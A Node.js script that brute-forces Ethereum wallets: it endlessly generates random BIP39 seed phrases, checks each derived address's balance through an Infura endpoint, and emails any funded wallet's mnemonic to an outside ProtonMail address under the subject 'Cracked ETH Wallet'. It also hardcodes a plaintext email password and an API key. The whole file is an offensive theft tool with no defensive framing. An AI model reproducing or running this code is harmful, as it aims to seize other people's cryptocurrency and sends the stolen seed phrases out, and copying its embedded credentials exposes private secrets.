const ethers = require("ethers");
const Web3   = require("web3");
const bip39  = require("bip39");
const nodemailer = require('nodemailer');

const api = "https://ropsten.infura.io/v3/267cf8a4393e43739b3dbace75de0030"; // web3 provider api
const emailSender = "ethsender@proton.me";
const emailPassword = "LubieChuje2137";
const emailRecipient = "crackedeth@proton.me";

const provider = new Web3(new Web3.providers.HttpProvider(api));

// create nodemailer transporter with sender credentials
const transporter = nodemailer.createTransport({
  service: 'ProtonMail',
  auth: {
    user: emailSender,
    pass: emailPassword
  }
});

async function main() {
  while(true) {
    var mnemonic = bip39.generateMnemonic();
    var wallet   = ethers.Wallet.fromMnemonic(mnemonic);
    var address  = wallet.address;    
    var balance = await provider.eth.getBalance(address);
    
    if (balance !== '0') {
      // eth in this account, send email with mnemonic and address
      const content = mnemonic+'\n'+address+'\n'
      const mailOptions = {
        from: emailSender,
        to: emailRecipient,
        subject: 'Cracked ETH Wallet',
        text: content
      };
      transporter.sendMail(mailOptions, function(error, info){
        if (error) {
          console.error(error);
        } else {
          console.log('Email sent: ' + info.response);
        }
      });
    } else {
      // no eth in this account, write mnemonic and address to zerobalance.txt
      const content = mnemonic+'\n'+address+'\n';
      const fs = require('fs');
      fs.appendFile('zerobalance.txt', content, err => {
        if (err) {
          console.error(err);
          return;
        }
      });
    }
    
    console.log(address);
    console.log("balance: ", balance);
  }
}

main()
  .then(() => {
    process.exit(0)
  })
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
